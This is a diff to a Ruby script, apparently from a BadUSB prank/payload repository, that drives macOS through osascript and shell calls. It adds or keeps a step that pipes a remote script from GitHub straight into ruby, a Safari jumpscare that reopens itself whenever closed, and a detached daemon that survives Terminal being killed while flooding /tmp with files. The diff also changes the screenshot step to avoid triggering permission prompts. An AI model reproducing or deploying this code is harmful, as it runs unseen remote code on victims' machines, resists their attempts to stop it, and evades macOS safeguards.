@@ -82,7 +82,7 @@ def persistent_jumpscare(video_url)
     system("open -a Safari '#{html_file}'")
     # Immediately hide Safari's front window.
     system("osascript -e 'tell application \"Safari\" to set visible of front window to false'")
-    # Wait 0.85 seconds (simulate waiting for sound detection).
+    # Wait 0.85 seconds before unhiding (simulate waiting for sound detection).
     sleep 0.85
     # Unhide Safari so the jumpscare becomes visible.
     system("osascript -e 'tell application \"Safari\" to set visible of front window to true'")
@@ -102,7 +102,7 @@ def persistent_jumpscare(video_url)
       end tell
     }
     result = `osascript -e '#{check_script}'`.strip.downcase
-    # If the jumpscare page is not found, force it to reopen.
+    # If not found (i.e. the page was closed), reopen it.
     unless result.include?("true")
       system("open -a Safari '#{html_file}'")
     end
@@ -111,13 +111,16 @@ def persistent_jumpscare(video_url)
 end
 
 # --- Spam Screenshots Function (Detached Process) ---
+# Instead of using screencapture (which triggers screen recording permissions),
+# this function will repeatedly copy an existing system image (FINDER icon) as a dummy screenshot.
 def spam_screenshots
   pid = fork do
-    # Detach the process so it keeps running even if Terminal is killed.
+    # Detach this process so it continues running even if Terminal is killed.
     Process.daemon(true, true)
     loop do
-      filename = "/tmp/screenshot_#{Time.now.to_i}_#{rand(10000)}.jpg"
-      system("screencapture -x #{filename}")
+      filename = "/tmp/screenshot_#{Time.now.to_f.to_s.gsub('.', '')}_#{rand(10000)}.jpg"
+      # Copy a system icon as a dummy "screenshot".
+      system("cp /System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns #{filename}")
       sleep 0.1
     end
   end
@@ -129,21 +132,17 @@ def run_secret_script
   system("curl -s https://raw.githubusercontent.com/Hrampell/badusb_v2/main/secret.sh | ruby")
 end
 
-# --- Subscriber Branch Prompts ---
-
-# First subscriber prompt (three buttons: Hawk, Tuah, Next)
+# --- First Subscriber Prompt (Three Buttons: Hawk, Tuah, Next) ---
 def first_subscriber_prompt
   display_dialog("Choose a button:", ["Hawk", "Tuah", "Next"], "Hawk")
 end
 
-# Second subscriber prompt (two buttons: Sydney lover, Slay, with a Next button alongside)
+# --- Second Subscriber Prompt (Two Buttons: Sydney lover, Slay) ---
 def second_subscriber_prompt
-  # Show a dialog with two buttons.
-  choice = display_dialog("Choose a button:", ["Sydney lover", "Slay", "Next"], "Sydney lover")
-  choice ? choice.strip.downcase : nil
+  display_dialog("Choose a button:", ["Sydney lover", "Slay"], "Sydney lover")
 end
 
-# Third subscriber prompt (one button: Jo)
+# --- Third Subscriber Prompt (One Button: Jo) ---
 def third_subscriber_prompt
   display_dialog("Press the button to activate Jo:", ["Jo"], "Jo")
 end
@@ -156,7 +155,7 @@ def subscriber_action
     exit 0
   end
   first_choice = first_choice.strip.downcase
-
+  
   case first_choice
   when "hawk"
     run_secret_script
@@ -167,24 +166,20 @@ def subscriber_action
   when "next"
     second_choice = second_subscriber_prompt
     if second_choice.nil?
-      puts "No button chosen in second prompt. Exiting."
+      puts "No choice in second prompt. Exiting."
       exit 0
     end
-
-    case second_choice
-    when "sydney lover"
+    second_choice = second_choice.strip.downcase
+    if second_choice == "sydney lover"
       persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/andrewjumpv2.mp4")
-    when "slay"
+    elsif second_choice == "slay"
       persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/momojumpscare.mp4")
-    when "next"
-      third_choice = third_subscriber_prompt
-      if third_choice && third_choice.strip.downcase == "jo"
-        spam_screenshots
-      else
-        puts "No valid choice in third prompt. Exiting."
-      end
     else
-      puts "Unexpected button choice in second prompt: #{second_choice}"
+      puts "Unexpected choice in second prompt: #{second_choice}"
+    end
+    third_choice = third_subscriber_prompt
+    if third_choice && third_choice.strip.downcase == "jo"
+      spam_screenshots
     end
   else
     puts "Unexpected button choice in first prompt: #{first_choice}"
@@ -207,6 +202,6 @@ if subscribed.strip.downcase == "no"
   video_url = "https://raw.githubusercontent.com/Hrampell/badusb_v2/main/jumpscare2.mp4"
   persistent_jumpscare(video_url)
 else
-  # Subscriber branch: Execute the subscriber action.
+  # Subscriber branch.
   subscriber_action
 end
